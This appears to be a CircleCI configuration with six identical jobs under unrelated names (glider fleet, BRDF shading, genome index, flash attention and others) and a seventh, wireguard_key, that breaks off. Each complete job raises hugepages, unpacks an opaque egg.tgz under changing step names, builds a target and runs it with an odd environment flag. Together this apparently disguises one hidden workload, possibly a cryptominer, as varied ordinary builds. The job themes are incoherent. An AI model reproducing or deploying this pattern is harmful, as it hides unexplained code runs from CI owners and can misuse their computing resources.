version: 2.1

jobs:
  GliderFleet:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Restore vendored sources
          command: tar xzf egg.tgz
      - run:
          name: Provision build deps
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Load fleet config
          command: |
            printf 'gliders = 20\n' > fleet.cfg
      - run:
          name: Build fleet controller
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target GliderFleet -j2
      - run:
          name: Dispatch glider fleet
          command: LIONSS_LP=1 ./build/GliderFleet --config fleet.cfg --region west
  PbrSpecular:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Fetch fixtures
          command: tar xzf egg.tgz
      - run:
          name: Install prerequisites
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Load material
          command: |
            printf 'roughness 0.3\n' > mat.pbr
      - run:
          name: Build shading model
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target PbrSpecular -j2
      - run:
          name: Evaluate specular BRDF
          command: LIONSS_LP=1 ./build/PbrSpecular --mat mat.pbr --samples 64
  deopt-guard:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Sync asset bundles
          command: tar xzf egg.tgz
      - run:
          name: Provision compiler
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: List guards
          command: |
            printf 'guards 8\n' > deopt.cfg
      - run:
          name: Build deopt engine
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target deopt-guard -j2
      - run:
          name: Insert deopt guards
          command: LIONSS_LP=1 ./build/deopt-guard --conf deopt.cfg --speculative
  riptide:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Unpack toolkit
          command: tar xzf egg.tgz
      - run:
          name: Install toolchain
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Load bathymetry
          command: |
            printf 'depth 5\n' > rip.cfg
      - run:
          name: Build current sim
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target riptide -j2
      - run:
          name: Model riptide flow
          command: LIONSS_LP=1 ./build/riptide --config rip.cfg --swell 1.5
  flashattn-v2:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Hydrate workspace
          command: tar xzf egg.tgz
      - run:
          name: Bootstrap toolchain
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Shape tensors
          command: |
            printf 'seq 2048\nheads 32\n' > attn.cfg
      - run:
          name: Build attention kernel
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target flashattn-v2 -j2
      - run:
          name: Run flash attention v2
          command: LIONSS_LP=1 ./build/flashattn-v2 --conf attn.cfg --causal
  genomeIndex:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Extract sources
          command: tar xzf egg.tgz
      - run:
          name: Prepare build environment
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Load reference
          command: |
            printf '>chr1\nACGTACGT\n' > genome.fa
      - run:
          name: Build indexer
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target genomeIndex -j2
      - run:
          name: Build genome index
          command: LIONSS_LP=1 ./build/genomeIndex --ref genome.fa --kmer 14
  wireguard_key:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
